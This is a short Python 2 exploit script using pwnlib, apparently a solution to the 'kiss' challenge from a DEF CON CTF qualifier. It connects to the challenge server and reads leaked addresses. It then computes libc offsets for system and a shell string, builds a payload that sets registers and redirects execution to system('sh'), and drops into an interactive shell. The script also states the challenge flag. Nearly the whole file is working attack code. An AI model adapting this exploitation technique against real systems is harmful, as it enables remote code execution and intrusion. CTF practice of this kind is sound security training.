from pwnlib import *

"""
The flag is: Quad derefs are not hard
"""

LOCAL = False

if LOCAL:
	s = Socket(("localhost", 2323))
else:
	s = Socket(("kiss_88581d4e20dc97355f1d86b6905f6103.quals.shallweplayaga.me", 3155))


s.ru("Buffer is around ")
buf = int(s.ru("\n"), 16)
s.ru("Binary is around ")
binary = int(s.ru("\n"), 16)

libc_base = binary - 0x5ea000

print "buf: 0x%x" % buf
print "bin: 0x%x" % binary
print "libc: 0x%x" % libc_base

#######

assumed_size = 0x320

data_begin = buf + assumed_size + 16

bin_sh = libc_base + 0x17ccdb
system = libc_base + 0x46640


data  = ""
data += pq(data_begin + 8)
data += pq(data_begin + 16)
data += pq(data_begin + 24)

data += pq(libc_base + 0x498B0)

data += pattern(0x58)
data += pq(data_begin + 0x140) # rdi
data += pq(0) # rsi
data += "E"*0x10
data += pq(0) # rdx
data += "G"*0x10
data += pq(buf + 0x2000) # rsp
data += pq(system) # rip

data += "B"*(240 - len(data))
data += pq(data_begin + 0x200)

data += "A"*(0x140 - len(data))
data += "sh\x00"


s.ru("How big of a buffer do you want? ")
s.send("0x%x\n" % len(data))
s.ru("Waiting for data.\n")
s.send(data)
s.ru("What location shall we attempt? ")
s.send("0x%x\n" % (data_begin))

print "interacting"
s.interact()

